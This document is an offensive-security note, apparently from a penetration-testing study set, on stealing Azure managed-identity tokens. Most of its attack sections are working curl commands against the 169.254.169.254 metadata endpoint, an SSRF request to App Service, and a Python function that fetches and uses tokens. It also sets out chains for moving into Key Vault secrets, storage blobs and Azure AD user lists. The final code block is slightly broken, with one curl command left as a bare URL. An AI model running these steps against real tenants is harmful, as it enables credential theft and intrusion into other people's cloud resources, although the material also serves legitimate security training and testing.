# 02.3 — Managed Identity Abuse

## What This Note Covers

Managed identities are the Azure equivalent of EC2 instance profiles — they give Azure resources an automatic identity without managing credentials. This note covers how managed identities work, how to steal tokens from them via the metadata service, and how to use those tokens to move laterally through Azure.

---

## What Is a Managed Identity?

A **managed identity** is an Azure AD identity automatically created and managed by Azure for a specific resource. The resource (VM, App Service, Function App, Container Instance, AKS pod, etc.) gets an identity it can use to authenticate to any service that supports Azure AD auth — without storing any credentials.

Azure handles:
- Identity creation in Azure AD
- Credential rotation (you never see the private key)
- Token issuance on request

### System-Assigned vs User-Assigned

| Property | System-Assigned | User-Assigned |
|---|---|---|
| Lifecycle | Tied to the resource — deleted with it | Standalone resource, independent lifecycle |
| Assignment | One per resource | Can be assigned to multiple resources |
| Object ID | Unique per resource | Single object, shared across assignments |
| Use case | Single-resource identity | Shared identity across multiple resources |

```bash
# Check if a VM has a managed identity assigned
az vm show \
  --resource-group TARGET_RG \
  --name TARGET_VM \
  --query "identity"

# Output for system-assigned:
{
  "principalId": "OBJECT_ID",
  "tenantId": "TENANT_ID",
  "type": "SystemAssigned"
}

# List all user-assigned managed identities in subscription
az identity list --output table

# Get the managed identity's permissions (RBAC roles assigned to it)
az role assignment list \
  --assignee PRINCIPAL_ID \
  --all --output table
```

## The Attack: IMDS Token Theft

The Azure Instance Metadata Service (IMDS) at `http://169.254.169.254` is accessible from within any Azure compute resource. If a resource has a managed identity, you can request an access token from IMDS — no credentials needed, just network reachability.

**Attack scenarios:**
1. You've gained code execution on an Azure VM (via RCE, webshell, SSH brute force)
2. You've exploited an SSRF vulnerability in a web app running on App Service, Azure Functions, or a VM
3. You have direct shell access via Azure Serial Console or Run Command feature

### Step 1: Confirm Managed Identity Exists

```bash
# From inside the resource (or via SSRF):
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool

# This returns instance metadata — look for managed identity info
# If the resource has a managed identity, the /identity endpoint will work
```

### Step 2: Request an Access Token

```bash
# Get a token for Azure Resource Manager (manage Azure resources)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Returns:
{
  "access_token": "eyJ0eXAiOiJKV1Qi...",
  "expires_in": "86399",
  "expires_on": "...",
  "token_type": "Bearer",
  "resource": "https://management.azure.com/"
}

# Get a token for Microsoft Graph (Azure AD operations)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | python3 -m json.tool

# Get a token for Azure Key Vault
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -m json.tool

# Get a token for Azure Storage
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
  | python3 -m json.tool
```

> [!tip] Request tokens for different resources
> The same managed identity can have permissions across multiple Azure services. Always request tokens for ARM, Graph, Key Vault, and Storage — you don't know which ones the identity has access to until you try.

### Step 3: Use the Token

```bash
TOKEN="eyJ0eXAiOiJKV1Qi..."

# Identify the managed identity (who is this token for?)
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List all subscriptions accessible
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List resources in a subscription
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/SUB_ID/resources?api-version=2021-04-01"

# If token is for Graph — list all Azure AD users
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users"

# If token is for Key Vault — list secrets
curl -H "Authorization: Bearer $TOKEN" \
  "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4"
```

### Step 4: Enumerate the Identity's Permissions

```bash
# From outside (with your own credentials) — check what the managed identity can do
PRINCIPAL_ID="OBJECT_ID_FROM_IDENTITY"

az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all --output table

# Common high-impact role assignments on managed identities:
# - Contributor on subscription → full resource control
# - Key Vault Secrets User → read all secrets from vault
# - Storage Blob Data Contributor → read/write all blob storage
# - Reader on subscription → full read access
```

## SSRF to Managed Identity Token — App Service

App Service (Azure's PaaS web hosting) also supports managed identities. The IMDS endpoint is the same.

```bash
# Via SSRF in a web app hosted on App Service:
GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/
Host: targetapp.azurewebsites.net
# (URL-encoded & for query string chaining)

# Alternative: App Service has its own internal token endpoint
# MSI_ENDPOINT and MSI_SECRET environment variables are set automatically
# From inside the app: $env:MSI_ENDPOINT + "?resource=https://management.azure.com/"
```

## Azure Functions Managed Identity Abuse

Function Apps running with a managed identity can be exploited the same way:

```bash
# If you can invoke a Function (via SSRF, public endpoint, or direct access)
# and the function has a managed identity:

# From inside the function execution context:
import requests
import os

def main(req):
    # Get token via IMDS
    token_url = "http://169.254.169.254/metadata/identity/oauth2/token"
    params = {
        "api-version": "2018-02-01",
        "resource": "https://management.azure.com/"
    }
    headers = {"Metadata": "true"}
    
    response = requests.get(token_url, params=params, headers=headers)
    token = response.json()["access_token"]
    
    # Use the token to list subscriptions
    arm_response = requests.get(
        "https://management.azure.com/subscriptions?api-version=2020-01-01",
        headers={"Authorization": f"Bearer {token}"}
    )
    return arm_response.text
```

## Lateral Movement via Managed Identity

Once you have a managed identity token, the next step is lateral movement — using the identity's permissions to access other resources.

### Common Lateral Movement Chains

**VM Managed Identity → Key Vault → Application Credentials:**
```
1. Steal VM's managed identity token
2. Request token for Key Vault (resource=https://vault.azure.net)
3. List and read secrets from Key Vault
4. Find application credentials (DB passwords, API keys, service principal certs)
5. Use those credentials to access databases, APIs, or impersonate service principals
```

**App Service Managed Identity → Storage Account → Code/Config:**
```
1. SSRF on web app → steal managed identity token
2. Request token for Storage (resource=https://storage.azure.com/)
3. List storage containers and blobs
4. Download application configs, deployment packages, or backup files
5. Extract credentials from configs
```

**Managed Identity → Graph API → Azure AD Enumeration:**
```
1. Steal managed identity token
2. Request token for Graph API (resource=https://graph.microsoft.com/)
3. List all Azure AD users, groups, service principals
4. Find admin accounts, identify targets for further attack
```

```bash
# From inside Azure VM/App Service/Function (or via SSRF):

# Get ARM token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get Graph token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Get Key Vault token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Use token to enumerate subscriptions
TOKEN="eyJ..."

  "https://management.azure.com/subscriptions?api-version=2020-01-01"

```
